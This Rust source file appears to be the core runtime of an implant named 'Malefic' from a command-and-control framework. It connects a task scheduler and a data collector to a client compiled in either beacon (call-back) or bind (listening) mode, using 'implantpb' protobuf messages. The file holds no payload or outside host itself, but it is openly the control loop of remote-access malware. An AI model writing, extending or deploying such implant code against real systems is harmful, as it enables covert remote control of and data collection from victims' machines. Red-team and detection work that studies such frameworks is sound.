use cfg_if::cfg_if;
use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
use futures::try_join;

use malefic_core::collector::Collector;
use malefic_core::scheduler::{Scheduler, TaskOperator};
use malefic_modules::MaleficModule;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::{Spite, Spites};

pub struct Malefic {}
pub struct MaleficChannel {
    pub(crate) data_sender: UnboundedSender<Spite>,
    pub(crate) request_sender: UnboundedSender<bool>,
    pub(crate) response_receiver: UnboundedReceiver<Spites>,
    pub(crate) scheduler_task_sender: UnboundedSender<(bool, u32, Box<MaleficModule>, Body)>,
    pub(crate) scheduler_task_ctrl: UnboundedSender<(u32, TaskOperator)>,
}

impl Malefic {
    pub async fn run(instance_id: [u8; 4]) {
        cfg_if! {
            if #[cfg(feature = "runtime_tokio")] {
                let runtime = tokio::runtime::Runtime::new().unwrap();
                runtime.block_on(async move {
                    Self::run_internal(instance_id).await
                });
            } else {
                Self::run_internal(instance_id).await;
            }
        }
    }

    async fn run_internal(instance_id: [u8; 4]) {
        let (collector_response_sender, collector_response_receiver) = mpsc::unbounded();

        let mut collector = Collector::new(collector_response_sender);
        let mut scheduler = Scheduler::new(collector.get_data_sender());
        let channel = MaleficChannel {
            data_sender: collector.get_data_sender(),
            request_sender: collector.get_request_sender(),
            response_receiver: collector_response_receiver,
            scheduler_task_sender: scheduler.get_task_sender(),
            scheduler_task_ctrl: scheduler.get_task_ctrl_sender(),
        };

        cfg_if!(
            if #[cfg(feature = "beacon")] {
                use crate::beacon::MaleficBeacon;
                let mut client = MaleficBeacon::new(instance_id, channel);
            }else if #[cfg(feature = "bind")] {
                use crate::bind::MaleficBind;
                let mut client = MaleficBind::new(channel).await;
            }
        );

        let _ = try_join!(scheduler.run(), collector.run(), client.run());
    }
}
